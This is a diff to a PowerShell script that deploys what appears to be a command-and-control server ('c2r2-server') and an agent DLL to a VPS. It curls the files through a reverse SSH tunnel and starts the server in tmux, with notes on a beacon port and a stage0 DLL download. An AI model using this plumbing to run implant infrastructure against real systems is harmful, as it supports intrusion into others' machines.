@@ -138,64 +138,89 @@ if (-not $SkipServer) {
 }
 
 # ---------------------------------------------------------------------------
-# [3] Deploy to VPS via SCP + SSH
+# [3] Deploy to VPS via Python HTTP server + curl (reverse SSH tunnel)
 # ---------------------------------------------------------------------------
 Step "[3/3] Deploying to ${VpsUser}@${Ip}:${VpsDir}"
 
-# Verify SSH connectivity
-Write-Host "  Testing SSH..." -ForegroundColor DarkGray
-$sshTest = & ssh -o ConnectTimeout=8 -o BatchMode=yes "${VpsUser}@${Ip}" "echo ok" 2>&1
-if ($LASTEXITCODE -ne 0) { Die "SSH connection to ${VpsUser}@${Ip} failed: $sshTest" }
-Write-Host "  SSH OK" -ForegroundColor Green
+$SshOpts = @("-o", "ConnectTimeout=20", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=accept-new")
 
-# Stop running server
-Write-Host "  Stopping running c2r2-server (if any)..." -ForegroundColor DarkGray
-& ssh "${VpsUser}@${Ip}" "pkill -f 'c2r2-server' 2>/dev/null; sleep 1; echo stopped"
+# Decide what to transfer
+$filesToServe = @()
+if (-not $SkipServer) { $filesToServe += "c2r2-server-x86_64" }
+if (-not $SkipAgent)  { $filesToServe += "agent.dll" }
+if ($filesToServe.Count -eq 0) { Die "Nothing to deploy (-SkipAgent and -SkipServer both set)" }
 
-# Upload server binary
-if (-not $SkipServer) {
-    Write-Host "  Uploading c2r2-server..." -ForegroundColor DarkGray
-    & scp (Join-Path $DistDir "c2r2-server-x86_64") "${VpsUser}@${Ip}:${VpsDir}/c2r2-server"
-    if ($LASTEXITCODE -ne 0) { Die "scp c2r2-server failed" }
-    & ssh "${VpsUser}@${Ip}" "chmod +x ${VpsDir}/c2r2-server"
-    Write-Host "  -> c2r2-server uploaded + chmod +x" -ForegroundColor Green
+# Pick a random high port for the local HTTP server (avoids conflicts)
+$HttpPort = Get-Random -Minimum 19000 -Maximum 19999
+
+Write-Host "  Starting local HTTP server on port $HttpPort serving $DistDir..." -ForegroundColor DarkGray
+
+# Start python HTTP server as a background job in DistDir
+$pyJob = Start-Job -ScriptBlock {
+    param($dir, $port)
+    Set-Location $dir
+    python -m http.server $port --bind 127.0.0.1 2>&1
+} -ArgumentList $DistDir, $HttpPort
+
+Start-Sleep 1  # give python time to bind
+
+Write-Host "  HTTP server PID (job): $($pyJob.Id)" -ForegroundColor DarkGray
+
+# Build curl commands for each file
+$curlCmds = @()
+foreach ($f in $filesToServe) {
+    $dest = switch ($f) {
+        "c2r2-server-x86_64" { '~/c2r2/c2r2-server' }
+        "agent.dll"          { '~/c2r2/dist/agent.dll' }
+    }
+    $curlCmds += "curl -fsSL http://127.0.0.1:${HttpPort}/${f} -o ${dest}"
 }
+$curlBlock = $curlCmds -join "`n"
 
-# Upload agent.dll
-if (-not $SkipAgent) {
-    Write-Host "  Uploading agent.dll..." -ForegroundColor DarkGray
-    & scp (Join-Path $DistDir "agent.dll") "${VpsUser}@${Ip}:${VpsDir}/dist/agent.dll"
-    if ($LASTEXITCODE -ne 0) { Die "scp agent.dll failed" }
-    $remoteSize = & ssh "${VpsUser}@${Ip}" "stat -c%s ${VpsDir}/dist/agent.dll"
-    Write-Host "  -> dist/agent.dll : $([math]::Round($remoteSize/1KB,1)) KB" -ForegroundColor Green
-}
+$remoteScript = @"
+set -e
+mkdir -p ~/c2r2/dist ~/c2r2/logs
 
-# Start the server detached with nohup (no TTY required; use tmux manually if
-# you need the interactive rustyline CLI: tmux attach -t c2r2)
-Write-Host ""
-Write-Host "  Starting c2r2-server on VPS (nohup detached)..." -ForegroundColor DarkGray
+# Download files via reverse tunnel
+${curlBlock}
 
-# Kill any existing session / old process
-& ssh "${VpsUser}@${Ip}" "tmux kill-session -t c2r2 2>/dev/null; pkill -f 'c2r2-server' 2>/dev/null; sleep 1"
+# Fix permissions
+chmod +x ~/c2r2/c2r2-server 2>/dev/null || true
 
-$startCmd = "mkdir -p ${VpsDir}/logs && nohup ${VpsDir}/c2r2-server --bind 0.0.0.0 --port ${Port} --api-port ${ApiPort} >> ${VpsDir}/logs/server.log 2>&1 &"
-& ssh "${VpsUser}@${Ip}" $startCmd
-Start-Sleep 4
+# Show sizes
+ls -lh ~/c2r2/c2r2-server ~/c2r2/dist/agent.dll 2>/dev/null | awk '{print "[ok]", `$5, `$9}'
 
-# Verify it's running
-$pidCheck = & ssh "${VpsUser}@${Ip}" "pgrep -la c2r2-server 2>/dev/null"
-if ($LASTEXITCODE -eq 0 -and $pidCheck) {
-    Write-Host "  c2r2-server running: $pidCheck" -ForegroundColor Green
-} else {
-    Write-Host "  WARNING: c2r2-server may not have started" -ForegroundColor Red
-    & ssh "${VpsUser}@${Ip}" "tail -20 ${VpsDir}/logs/server.log 2>/dev/null"
-}
+# Stop old server (tmux session + process)
+tmux kill-session -t c2r2 2>/dev/null || true
+pkill -f 'c2r2-server' 2>/dev/null || true
+sleep 1
 
-# Verify ports listening
-$ports = & ssh "${VpsUser}@${Ip}" "ss -tlnp 2>/dev/null | grep -E ':${Port}|:${ApiPort}'"
-if ($ports) {
-    Write-Host "  Ports listening:" -ForegroundColor Green
-    $ports | ForEach-Object { Write-Host "    $_" }
+# Start server inside a detached tmux session so it keeps running after SSH closes
+tmux new-session -d -s c2r2 "cd ~/c2r2 && ./c2r2-server --bind 0.0.0.0 --port ${Port} --api-port ${ApiPort} 2>&1 | tee -a logs/server.log"
+sleep 3
+
+# Verify
+echo "--- process ---"
+pgrep -la c2r2-server || echo "WARNING: process not found"
+echo "--- ports ---"
+ss -tlnp 2>/dev/null | grep -E ':${Port}|:${ApiPort}' || echo "WARNING: ports not listening yet"
+echo "--- log (last 6) ---"
+tail -6 ~/c2r2/logs/server.log 2>/dev/null || echo "(no log yet)"
+"@
+
+# SSH with reverse tunnel: VPS:HttpPort -> localhost:HttpPort
+Write-Host "  SSH reverse tunnel :$HttpPort -> localhost:$HttpPort  (curl + start)" -ForegroundColor DarkGray
+$sshWithTunnel = $SshOpts + @("-R", "${HttpPort}:127.0.0.1:${HttpPort}")
+
+& ssh @sshWithTunnel "${VpsUser}@${Ip}" $remoteScript.Replace("`r`n", "`n").Replace("`r", "`n")
+$sshExit = $LASTEXITCODE
+
+# Always kill the local HTTP server
+Stop-Job $pyJob -PassThru | Remove-Job -Force
+Write-Host "  Local HTTP server stopped." -ForegroundColor DarkGray
+
+if ($sshExit -ne 0) {
+    Write-Host "  WARNING: remote script returned exit $sshExit" -ForegroundColor Red
 }
 
 # ---------------------------------------------------------------------------
@@ -210,9 +235,6 @@ Write-Host "  VPS    : ${VpsUser}@${Ip}" -ForegroundColor White
 Write-Host "  Beacon : ${Ip}:${Port}  (TLS, agent connects here)" -ForegroundColor White
 Write-Host "  API    : http://${Ip}:${ApiPort}  (team-client, stage0 DLL download)" -ForegroundColor White
 Write-Host ""
-Write-Host "Last 5 log lines:" -ForegroundColor Cyan
-& ssh "${VpsUser}@${Ip}" "tail -5 ${VpsDir}/logs/server.log 2>/dev/null || echo '(no log yet)'"
-Write-Host ""
 Write-Host "Tip: attach to server console with:" -ForegroundColor DarkGray
-Write-Host "  ssh ${VpsUser}@${Ip} -t 'tmux attach -t c2r2'" -ForegroundColor DarkGray
+Write-Host "  ssh ${VpsUser}@${Ip} 'tail -f ~/c2r2/logs/server.log'" -ForegroundColor DarkGray
 Write-Host ""
